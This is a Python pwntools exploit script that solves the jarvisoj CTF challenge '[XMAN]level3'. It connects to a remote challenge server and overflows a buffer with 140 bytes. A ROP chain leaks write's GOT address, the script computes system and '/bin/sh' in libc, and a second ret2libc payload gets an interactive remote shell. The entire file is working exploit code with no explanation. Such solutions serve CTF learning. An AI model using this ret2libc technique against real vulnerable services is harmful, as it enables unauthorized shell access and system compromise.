from pwn import *


def x_man_level3(file_name='/mnt/hgfs/CyberSecurity/PWN/jarvisoj/level3/[XMAN]level3'):
    print('[XMAN]level3 start')
    target = process([file_name])
    target = remote('pwn2.jarvisoj.com', 9879)
    target_elf = ELF(file_name)
    libc_elf = ELF('/mnt/hgfs/CyberSecurity/PWN/jarvisoj/level3/libc-2.19.so')
    # libc_elf = ELF('/lib/i386-linux-gnu/libc.so.6')

    vulnerable_func_addr = p32(target_elf.symbols['vulnerable_function'])
    write_elf = p32(target_elf.plt['write'])
    write_got = p32(target_elf.got['write'])

    pop_ret = p32(0x080482f1)  # pop ebx ; ret
    pop3_ret = p32(0x08048519)  # pop esi ; pop edi ; pop ebp ; ret

    payload_1 = b'A' * 140

    # write(1, &write_got, 4u);
    payload_1 += write_elf + pop3_ret + p32(0x1) + write_got + p32(0x4)

    payload_1 += vulnerable_func_addr

    target.sendline(payload_1)
    print(target.recvuntil('Input:\n'))
    write_addr = u32(target.recv(4))

    print("write_addr: %x\n" % write_addr)

    write_libc_addr = libc_elf.symbols['write']
    system_libc_addr = libc_elf.symbols['system']
    bin_sh_libc_addr = next(libc_elf.search(b'/bin/sh'))

    print("write_libc_addr: %x" % write_libc_addr)
    print("system_libc_addr: %x" % system_libc_addr)
    print("bin_sh_libc_addr: %x" % bin_sh_libc_addr)

    system_addr = p32(write_addr - (write_libc_addr - system_libc_addr))
    bin_sh_addr = p32(write_addr + (bin_sh_libc_addr - write_libc_addr))

    print("system_addr: %x" % (write_addr - (write_libc_addr - system_libc_addr)))
    print("bin_sh_addr: %x" % (write_addr + (bin_sh_libc_addr - write_libc_addr)))

    payload_2 = b'A' * 140

    payload_2 += system_addr + pop_ret + bin_sh_addr

    # gdb.attach(target)

    target.sendline(payload_2)

    target.interactive()

    print('[XMAN]level3 end')


if __name__ == '__main__':
    x_man_level3()
